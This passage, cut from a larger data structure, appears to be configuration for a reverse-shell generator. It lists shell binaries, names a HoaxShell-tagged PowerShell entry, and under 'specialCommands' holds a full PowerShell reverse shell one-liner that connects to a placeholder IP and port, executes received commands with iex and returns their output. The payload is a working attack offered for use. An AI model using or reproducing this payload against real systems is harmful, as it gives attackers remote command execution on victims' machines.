                                       'meta': ['windows', 'HoaxShell'],
                                       'name': 'PowerShell Outfile Constr Lang '
                                               'Mode https'}],
             'shells': ['sh',
                        '/bin/sh',
                        'bash',
                        '/bin/bash',
                        'cmd',
                        'powershell',
                        'pwsh',
                        'ash',
                        'bsh',
                        'csh',
                        'ksh',
                        'zsh',
                        'pdksh',
                        'tcsh',
                        'mksh',
                        'dash'],
             'specialCommands': {'PowerShell payload': '$client = New-Object '
                                                       'System.Net.Sockets.TCPClient("{ip}",{port});$stream '
                                                       '= '
                                                       '$client.GetStream();[byte[]]$bytes '
                                                       '= '
                                                       '0..65535|%{0};while(($i '
                                                       '= $stream.Read($bytes, '
                                                       '0, $bytes.Length)) -ne '
                                                       '0){;$data = '
                                                       '(New-Object -TypeName '
                                                       'System.Text.ASCIIEncoding).GetString($bytes,0, '
                                                       '$i);$sendback = (iex '
                                                       '$data 2>&1 | '
                                                       'Out-String '
                                                       ');$sendback2 = '
                                                       '$sendback + "PS " + '
                                                       '(pwd).Path + "> '
                                                       '";$sendbyte = '
                                                       '([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'},
             'upgrade': ['python']}}
